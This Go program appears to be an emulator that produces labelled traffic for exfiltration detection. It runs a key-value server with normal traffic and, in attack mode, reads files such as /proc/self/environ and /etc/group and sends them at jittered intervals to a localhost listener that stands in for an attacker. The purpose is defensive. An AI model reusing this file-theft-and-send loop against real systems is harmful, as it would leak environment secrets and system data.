package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

type Label struct {
	Timestamp int64  `json:"ts"`
	Type      string `json:"type"`
	Detail    string `json:"detail"`
}

var (
	mode           string
	duration       time.Duration
	attackInterval time.Duration
	normalRate     int
	labelFile      *os.File
	labelMu        sync.Mutex
)

func writeLabel(l Label) {
	labelMu.Lock()
	defer labelMu.Unlock()
	if labelFile != nil {
		data, _ := json.Marshal(l)
		labelFile.Write(append(data, '\n'))
	}
}

// In-memory key-value store.
var (
	kvStore = make(map[string]string)
	kvMu    sync.RWMutex
)

func handleKV(w http.ResponseWriter, r *http.Request) {
	key := strings.TrimPrefix(r.URL.Path, "/kv/")
	if key == "" {
		http.Error(w, "missing key", http.StatusBadRequest)
		return
	}

	switch r.Method {
	case http.MethodGet:
		kvMu.RLock()
		val, ok := kvStore[key]
		kvMu.RUnlock()
		if !ok {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		fmt.Fprint(w, val)
		log.Printf("[NORMAL] GET /kv/%s -> %d bytes", key, len(val))

	case http.MethodPut:
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "read error", http.StatusInternalServerError)
			return
		}
		kvMu.Lock()
		kvStore[key] = string(body)
		kvMu.Unlock()
		w.WriteHeader(http.StatusCreated)
		fmt.Fprint(w, "stored")
		log.Printf("[NORMAL] PUT /kv/%s -> %d bytes", key, len(body))

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// populateStore seeds the KV store with initial data.
func populateStore() {
	data := map[string]string{
		"user:alice":     `{"id":1,"name":"Alice","role":"admin","api_key":"sk-abc123"}`,
		"user:bob":       `{"id":2,"name":"Bob","role":"user","api_key":"sk-def456"}`,
		"config:db":      `{"host":"db.internal","port":5432,"password":"s3cret"}`,
		"config:redis":   `{"host":"redis.internal","port":6379}`,
		"session:active": `{"count":42,"last_login":"2025-01-01T00:00:00Z"}`,
		"metric:cpu":     `{"avg":0.45,"max":0.92}`,
		"metric:mem":     `{"used_mb":1024,"total_mb":4096}`,
		"log:latest":     `Processing batch job ID=12345`,
	}
	for k, v := range data {
		kvStore[k] = v
	}
}

// exfilListener runs a local TCP listener that acts as the "attacker's server".
func exfilListener() net.Listener {
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Fatalf("Could not start exfil listener: %v", err)
	}
	go func() {
		for {
			conn, err := l.Accept()
			if err != nil {
				return
			}
			// Drain received data (simulating attacker receiving exfiled data).
			go func(c net.Conn) {
				io.Copy(io.Discard, c)
				c.Close()
			}(conn)
		}
	}()
	return l
}

// exfilGoroutine slowly exfiltrates sensitive files one at a time.
func exfilGoroutine(stopCh <-chan struct{}, exfilAddr string) {
	sensitiveFiles := []string{
		"/etc/hostname",
		"/etc/resolv.conf",
		"/proc/self/environ",
		"/proc/self/maps",
		"/proc/self/cmdline",
		"/proc/self/status",
		"/etc/os-release",
		"/etc/group",
	}

	fileIdx := 0
	for {
		wait := time.Duration(float64(attackInterval) * (0.5 + rand.ExpFloat64()))
		select {
		case <-stopCh:
			return
		case <-time.After(wait):
			if fileIdx >= len(sensitiveFiles) {
				fileIdx = 0 // Loop back for continuous exfil.
			}
			target := sensitiveFiles[fileIdx]
			fileIdx++

			log.Printf("[ATTACK] Exfiltrating: %s", target)

			// Phase 1: Open and read the sensitive file.
			// Syscalls: open -> read -> close
			data, err := os.ReadFile(target)
			if err != nil {
				log.Printf("[ATTACK] Could not read %s: %v", target, err)
				continue
			}

			writeLabel(Label{
				Timestamp: time.Now().UnixNano(),
				Type:      "data_exfil",
				Detail:    fmt.Sprintf("file=%s bytes=%d", target, len(data)),
			})

			// Phase 2: Connect to exfil endpoint and send data.
			// Syscalls: socket -> connect -> send -> close
			conn, err := net.DialTimeout("tcp", exfilAddr, 2*time.Second)
			if err != nil {
				log.Printf("[ATTACK] Exfil connect failed: %v", err)
				continue
			}
			conn.Write([]byte(fmt.Sprintf("--- %s ---\n", target)))
			conn.Write(data)
			conn.Write([]byte("\n--- END ---\n"))
			conn.Close()

			log.Printf("[ATTACK] Exfiltrated %s (%d bytes)", target, len(data))
		}
	}
}

// normalTrafficGenerator generates KV store traffic.
func normalTrafficGenerator(stopCh <-chan struct{}) {
	keys := []string{"user:alice", "user:bob", "config:db", "config:redis",
		"session:active", "metric:cpu", "metric:mem", "log:latest"}
	client := &http.Client{Timeout: 2 * time.Second}
	interval := time.Second / time.Duration(normalRate)

	for {
		select {
		case <-stopCh:
			return
		default:
			// 70% reads, 30% writes.
			if rand.Float64() < 0.7 {
				key := keys[rand.Intn(len(keys))]
				url := fmt.Sprintf("http://localhost:8080/kv/%s", key)
				resp, err := client.Get(url)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			} else {
				key := fmt.Sprintf("temp:%d", rand.Intn(100))
				url := fmt.Sprintf("http://localhost:8080/kv/%s", key)
				body := strings.NewReader(fmt.Sprintf(`{"value":%d,"ts":%d}`, rand.Intn(1000), time.Now().Unix()))
				req, _ := http.NewRequest(http.MethodPut, url, body)
				resp, err := client.Do(req)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
			time.Sleep(interval)
		}
	}
}

func main() {
	flag.StringVar(&mode, "mode", "normal", "Run mode: 'normal' or 'attack'")
	flag.DurationVar(&duration, "duration", 120*time.Second, "Total runtime duration")
	flag.DurationVar(&attackInterval, "attack-interval", 5*time.Second, "Mean time between exfil actions")
	flag.IntVar(&normalRate, "normal-rate", 10, "Normal operations per second")
	flag.Parse()

	if envMode := os.Getenv("MODE"); envMode != "" {
		mode = envMode
	}
	if envDur := os.Getenv("DURATION"); envDur != "" {
		if d, err := time.ParseDuration(envDur); err == nil {
			duration = d
		}
	}

	log.Printf("Starting Data Exfiltration Emulator | mode=%s duration=%s attack-interval=%s normal-rate=%d",
		mode, duration, attackInterval, normalRate)

	populateStore()

	var err error
	labelFile, err = os.OpenFile("/app/labels.jsonl", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Printf("Warning: could not open label file: %v", err)
		labelFile = nil
	}

	http.HandleFunc("/kv/", handleKV)
	http.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, "ok")
	})

	server := &http.Server{Addr: ":8080"}
	go func() {
		if err := server.ListenAndServe(); err != http.ErrServerClosed {
			log.Fatalf("HTTP server error: %v", err)
		}
	}()

	time.Sleep(500 * time.Millisecond)

	stopCh := make(chan struct{})
	go normalTrafficGenerator(stopCh)

	if mode == "attack" {
		// Start exfil listener (simulates attacker's receiving end).
		exfilL := exfilListener()
		go exfilGoroutine(stopCh, exfilL.Addr().String())
	}

	time.Sleep(duration)
	close(stopCh)

	if labelFile != nil {
		labelFile.Close()
	}

	log.Println("Emulator finished.")
}
